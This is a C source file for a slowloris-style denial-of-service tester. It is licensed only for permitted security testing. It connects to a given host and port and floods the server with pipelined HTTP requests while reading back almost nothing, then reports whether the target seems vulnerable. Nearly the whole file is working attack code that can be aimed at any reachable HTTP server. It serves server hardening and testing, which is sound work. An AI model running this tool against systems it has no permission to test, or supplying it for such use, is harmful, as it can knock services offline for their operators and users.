/*
Copyright 2019, Boaz Segev
License: ISC

License limitations: May only be used for security testing and with permission
of target device.
*/

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <ctype.h>
#include <errno.h>
#include <limits.h>
#include <pthread.h>
#include <signal.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>

#include <netdb.h>
#include <netinet/in.h>
#include <netinet/tcp.h>

#include <poll.h>
#include <sys/ioctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/un.h>
#include <sys/wait.h>

#include <arpa/inet.h>

#include <fcntl.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <unistd.h>

/* *****************************************************************************
Helper functions
***************************************************************************** */

#define ASSERT_COND(cond, ...)                                                 \
  do {                                                                         \
    if (!(cond)) {                                                             \
      fprintf(stderr, __VA_ARGS__);                                            \
      perror("\n\terrno");                                                     \
      exit(-1);                                                                \
    }                                                                          \
  } while (0)

/** Opens a TCP/IP connection using a blocking IO socket */
static int connect2tcp(const char *address, const char *port);

/** Waits for socket to become available for either reading or writing */
static int wait4fd(int fd);

/** Waits for socket to become available for reading */
static int wait4read(int fd);

/** Waits for socket to become available for reading */
static int wait4write(int fd);

/* *****************************************************************************
Main attack function
***************************************************************************** */

#define WAIT_BEFORE_EXIT 0
#define USE_PIPELINING 1
#define MSG_PER_MTU 18
#define MSG_LEN 27
#define ATTACK_LIMIT (1 << 16)
#define PIPELINED_MSG_LEN (MSG_LEN * MSG_PER_MTU)
const char HTTP_REQUEST[] = "GET / HTTP/1.1\r\nHost:me\r\n\r\n"; /* 27 chars */
char HTTP_PIPELINED[PIPELINED_MSG_LEN]; /* pipelined requests in MTU */

int main(int argc, char const *argv[]) {
  ASSERT_COND(argc == 3,
              "\nTo test HTTP/1.1 server against Slowloris, "
              "use: %s addr port\ni.e.:\t\t%s localhost 80",
              argv[0], argv[0]);
  for (size_t i = 0; i < MSG_PER_MTU; ++i) {
    memcpy(HTTP_PIPELINED + (i * MSG_LEN), HTTP_REQUEST, MSG_LEN);
  }
  const char *msg = USE_PIPELINING ? HTTP_PIPELINED : HTTP_REQUEST;
  const size_t msg_len = USE_PIPELINING ? PIPELINED_MSG_LEN : MSG_LEN;
  signal(SIGPIPE, SIG_IGN);
  int fd = connect2tcp(argv[1], argv[2]);
  time_t start = 0;
  time(&start);
  ASSERT_COND(fd != -1, "\n ERROR: couldn't connect to %s:%s", argv[1],
              argv[2]);
  size_t counter = 0;
  while (wait4write(fd) == 0 && counter < ATTACK_LIMIT) {
    size_t buf;
    ++counter;
    if (write(fd, msg, msg_len) == 1)
      break;
    if ((counter & 3) == 0)
      read(fd, &buf, 1); /* read a single byte at a time */
  }
  time_t end = 0;
  time(&end);
  if (counter == ATTACK_LIMIT) {
    fprintf(
        stderr,
        "DANGER: a single slowloris client attacker sent %zu requests and only "
        "read %zu bytes... the target is likely suseptible to an attack.\n",
        counter * (msg_len / MSG_LEN), (counter >> 2));
  } else {
    fprintf(
        stderr,
        "Passed: a single slowloris client attacker sent %zu requests and read "
        "%zu bytes... the target appears to have mitigated the attack.\n",
        counter * (msg_len / MSG_LEN), (counter >> 2));
  }
  fprintf(stderr, "Attack took %zu seconds. %s\n", (size_t)(end - start),
          ((WAIT_BEFORE_EXIT) ? "Press enter to finish" : ""));
  if (WAIT_BEFORE_EXIT)
    getchar();
  close(fd);
  return counter == ATTACK_LIMIT;
}

/* *****************************************************************************
Helper functions - implementation
***************************************************************************** */

/** Opens a TCP/IP connection using a blocking IO socket */
static int __attribute__((unused))
connect2tcp(const char *address, const char *port) {
  /* TCP/IP socket */
  struct addrinfo hints = {0};
  struct addrinfo *addrinfo;       // will point to the results
  memset(&hints, 0, sizeof hints); // make sure the struct is empty
  hints.ai_family = AF_UNSPEC;     // don't care IPv4 or IPv6
  hints.ai_socktype = SOCK_STREAM; // TCP stream sockets
  hints.ai_flags = AI_PASSIVE;     // fill in my IP for me
  if (getaddrinfo(address, port, &hints, &addrinfo)) {
    // perror("addr err");
    return -1;
  }
  // get the file descriptor
  int fd =
      socket(addrinfo->ai_family, addrinfo->ai_socktype, addrinfo->ai_protocol);
  if (fd <= 0) {
    freeaddrinfo(addrinfo);
    return -1;
  }

  int one = 1;
  setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
  errno = 0;
  for (struct addrinfo *i = addrinfo; i; i = i->ai_next) {
    if (connect(fd, i->ai_addr, i->ai_addrlen) == 0 || errno == EINPROGRESS)
      goto socket_okay;
    perror("Connect...");
  }
  freeaddrinfo(addrinfo);
  close(fd);
  return -1;
socket_okay:
  fprintf(stderr, "connection okay\n");
  freeaddrinfo(addrinfo);
  return fd;
}

/** Waits for socket to become available for either reading or writing */
static inline int wait__internal(int fd, uint16_t events) {
  errno = 0;
  int i = 0;
  do {
    struct pollfd ls[1] = {{.fd = fd, .events = events}};
    i = poll(ls, 1, 1000);
    if (i > 0) {
      if (ls[0].revents == POLLHUP || ls[0].revents == POLLERR ||
          ls[0].revents == POLLNVAL) {
        errno = EBADF;
        return -1;
      }
      return 0;
    }
    if (i == 0) {
      errno = EWOULDBLOCK;
      return -1;
    }
    switch (errno) {
    case EFAULT: /* overflow */
    case EINVAL: /* overflow */
    case ENOMEM: /* overflow */
    case EAGAIN: /* overflow */
      return -1;
    }
  } while (errno == EINTR);
  return -1;
}

/** Waits for socket to become available for either reading or writing */
static __attribute__((unused)) int wait4fd(int fd) {
  return wait__internal(fd, POLLIN | POLLOUT);
}
/** Waits for socket to become available for reading */
static __attribute__((unused)) int wait4read(int fd) {
  return wait__internal(fd, POLLIN);
}
/** Waits for socket to become available for reading */
static __attribute__((unused)) int wait4write(int fd) {
  return wait__internal(fd, POLLOUT);
}
